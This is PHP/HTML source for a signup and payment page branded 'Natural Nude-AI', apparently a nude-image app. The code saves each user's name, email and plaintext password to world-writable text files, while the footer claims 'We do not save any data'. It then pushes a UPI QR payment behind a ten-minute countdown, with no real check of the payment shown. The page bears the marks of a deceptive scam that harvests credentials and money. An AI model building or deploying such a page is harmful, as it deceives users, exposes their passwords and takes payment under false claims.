<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Customer Details Form</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="styles.css?v=<?php echo time(); ?>">
</head>
<body>
    <div class="header">
    <div class="header-name">Natural Nude-AI</div>
    <img class="header-logo" src="logo.svg" alt="Logo">
    </div>

    <?php
    // Step 1: Save customer details to file
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        $name = $_POST["name"];
        $email = $_POST["email"];
        $password = $_POST["password"];

        $data = $name . "\n";
        $data .= $email . "\n";
        $data .= $password . "\n";
        

        $folder = "users";
        if (!file_exists($folder)) {
            mkdir($folder, 0777, true);
        }

        $filename = generateFileName($name, $folder);
        $file = fopen($filename, "w");
        if ($file) {
            fwrite($file, $data);
            fclose($file);
            // Proceed to Step 2 after saving
            showPaymentOptions($name);
        } else {
            echo "<p>Error saving customer details. Please try again later.</p>";
        }
    } else {
        // Show the customer details form for Step 1
        showCustomerDetailsForm();
    }

    function generateFileName($name, $folder) {
        // Remove any unwanted characters from the name and make it lowercase
        $name = preg_replace("/[^a-zA-Z0-9]/", "", $name);
        $name = strtolower($name);
        // Generate a unique filename with a timestamp
        return $folder . "/" . $name . "_" . time() . ".txt";
    }

    function showCustomerDetailsForm() {
        echo '<div class="form-container">';
        echo '<h2>Create an account</h2>';
        echo '<form method="post">';
        echo '    <label for="name">Name:</label>';
        echo '    <input type="text" name="name" required><br>';
        echo '    <label for="email">Email:</label>';
        echo '    <input type="email" name="email" required><br>';
        echo '    <label for="password">Password:</label>';
        echo '    <input type="password" name="password" required><br>';
        echo '    <input type="submit" value="Proceed to next ">';
        echo '</form>';
        echo '</div>';
    }

    function showPaymentOptions($name) {
    echo '<div class="payment-options">';
    echo '<div class="countdown-timer">Time remaining: <span id="countdown">10:00</span></div>';
    echo '<h2>Make the Payment</h2>';
    echo '<p>Hi ' . htmlspecialchars($name) . '</p>';
    echo '<p>Your App ID: ' . generateRandomAppID() . '</p>';
    echo '<img src="pay-389.png" alt="pay" width="150"><br>';
    echo '<h2>Scan to Pay</h2>';
    echo '<div class="divider-container">';
    echo '    <div class="line2"></div>';
    echo '    <div class="or-text">Then</div>';
    echo '    <div class="line2"></div>';
    echo '</div>';
    echo '<div class="transaction-input">';
    echo '    <label for="transaction-id">Enter Transaction ID:</label>';
    echo '    <input type="text" id="transaction-id" name="transaction-id">';
    echo '    <button class="check-payment-button" onclick="checkPayment()">Check Payment</button>';
    echo '</div>';
    echo '<img class="bhim-logo" src="https://zeevector.com/wp-content/uploads/Upi-Logo-Vector.png" alt="BHIM UPI Logo" width="100">';
    echo '</div>';
    }
    
    
    function generateRandomAppID() {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $randomID = '';
        $length = 10; // Adjust the length of the App ID if needed

        for ($i = 0; $i < $length; $i++) {
            $randomID .= $characters[rand(0, strlen($characters) - 1)];
        }

        return $randomID;
    }
    ?>
    
    <br>
  <hr class="separator">
  
  <div class="bottom">We do not save any data.</div>
  <div class="bottom">We do not take any responsibility for images created using the App.</div>
  
    <script src="script.js?v=<?php echo time(); ?>"></script>
</body>
</html>